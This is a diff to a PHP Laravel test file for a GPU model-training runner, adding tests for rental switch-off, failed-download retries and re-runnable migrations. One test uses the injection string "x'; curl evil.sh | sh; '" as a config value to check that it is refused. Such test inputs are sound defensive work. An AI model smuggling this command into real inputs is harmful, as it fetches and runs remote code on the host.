@@ -11,10 +11,12 @@ use App\Services\AiprayDatasetReadiness;
 use App\Services\AiprayGpuTrainingRunner;
 use App\Services\AiprayTrainingCostEstimator;
 use App\Services\Gpu\SimplePodClient;
+use Illuminate\Console\Scheduling\Schedule;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Http\Client\ConnectionException;
 use Illuminate\Http\Client\Request;
 use Illuminate\Support\Facades\Http;
+use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Sleep;
 use Illuminate\Support\Str;
@@ -45,6 +47,7 @@ class AiprayGpuTrainingTest extends TestCase
             'services.simplepod.enabled' => true,
             'services.simplepod.api_key' => 'test-key',
             'services.simplepod.base_url' => 'https://simplepod.test',
+            'services.aipray_gpu.trainer_ref' => 'feat/gpu-trainer',
             'services.aipray_gpu.min_samples' => 3,
             // Three voices, one per line, count as "enough" here.
             'services.aipray_gpu.readiness' => [
@@ -134,7 +137,9 @@ class AiprayGpuTrainingTest extends TestCase
                     'stage' => $pod->stage, 'epoch' => 2, 'error' => 'CUDA out of memory',
                     'metrics' => ['wer' => 12.5, 'training_loss' => 0.31], 'log' => 'epoch 2 done',
                 ]),
-                $url === 'https://gpu.test/remote/artifact' => Http::response('PK-model-weights'),
+                $url === 'https://gpu.test/remote/artifact' => ($pod->artifactFails ?? false)
+                    ? throw new RuntimeException('stream cut half way')
+                    : Http::response('PK-model-weights'),
                 default => Http::response("unexpected {$method} {$url}", 599),
             };
         });
@@ -290,6 +295,96 @@ class AiprayGpuTrainingTest extends TestCase
             Http::assertNothingSent();
             $this->assertSame(0, AiprayTrainingJob::count());
         }
+    }
+
+    public function test_the_tick_does_nothing_and_calls_no_one_while_rental_is_off(): void
+    {
+        config(['services.simplepod.enabled' => false]); // the API key stays set
+        Http::fake();
+
+        $this->assertFalse($this->runner()->shouldTick());
+        $this->artisan('aipray:gpu-tick')->assertSuccessful();
+
+        Http::assertNothingSent();
+        $event = collect(app(Schedule::class)->events())
+            ->first(fn ($event) => str_contains((string) $event->command, 'aipray:gpu-tick'));
+        $this->assertNotNull($event);
+        $this->assertFalse($event->filtersPass($this->app), 'the scheduler must not even start the process');
+    }
+
+    public function test_a_machine_rented_before_rental_was_switched_off_is_still_returned(): void
+    {
+        $job = $this->trainingJob();
+        config(['services.simplepod.enabled' => false]);
+        $this->pod->stage = 'failed';
+
+        $this->assertTrue($this->runner()->shouldTick());
+        $this->artisan('aipray:gpu-tick')->assertSuccessful();
+
+        $this->assertSame('failed', $job->fresh()->gpu_state);
+        $this->assertSame(['501'], $this->pod->deleted);
+        $this->assertFalse($this->runner()->shouldTick());
+    }
+
+    public function test_a_queued_run_is_not_rented_once_rental_is_switched_off(): void
+    {
+        $job = $this->queue();
+        config(['services.simplepod.enabled' => false]);
+
+        $this->artisan('aipray:gpu-tick')->assertSuccessful();
+
+        $this->assertSame('failed', $job->fresh()->gpu_state);
+        $this->assertNull($this->pod->rentBody);
+    }
+
+    public function test_nothing_is_rented_until_the_trainer_is_pinned_to_a_safe_ref(): void
+    {
+        Http::fake();
+        foreach ([null, '', "x'; curl evil.sh | sh; '"] as $ref) {
+            config(['services.aipray_gpu.trainer_ref' => $ref]);
+
+            try {
+                $this->queue();
+                $this->fail('A run was queued with trainer_ref ' . var_export($ref, true));
+            } catch (RuntimeException $e) {
+                $this->assertStringContainsString('AIPRAY_TRAINER_REF', $e->getMessage());
+            }
+        }
+
+        Http::assertNothingSent();
+        $this->assertSame(0, AiprayTrainingJob::count());
+    }
+
+    public function test_a_model_download_cut_half_way_is_not_kept_and_is_tried_again(): void
+    {
+        $job = $this->trainingJob();
+        $this->pod->stage = 'completed';
+        $this->pod->artifactFails = true;
+
+        $this->runner()->tick();
+
+        $job->refresh();
+        $this->assertSame('collecting', $job->gpu_state);
+        $this->assertSame([], Storage::disk('local')->files('aipray_models'));
+        $this->assertSame([], $this->pod->deleted, 'the trained model is still on the machine');
+
+        $this->pod->artifactFails = false;
+        $this->runner()->tick();
+
+        $this->assertSame('done', $job->fresh()->gpu_state);
+        $this->assertSame(['501'], $this->pod->deleted);
+    }
+
+    public function test_the_2026_09_12_migrations_run_again_harmlessly_on_a_database_that_has_them(): void
+    {
+        // Production gets them after many later migrations; a re-run must not fail.
+        foreach (glob(database_path('migrations/2026_09_12_*.php')) as $file) {
+            (require $file)->up();
+        }
+
+        $this->assertTrue(Schema::hasColumn('aipray_training_jobs', 'runner'));
+        $this->assertTrue(Schema::hasColumn('aipray_audio_samples', 'contributor_id'));
+        $this->assertTrue(Schema::hasTable('aipray_contributors'));
     }
 
     public function test_a_real_run_waits_for_enough_voice_but_a_trial_may_go_ahead(): void
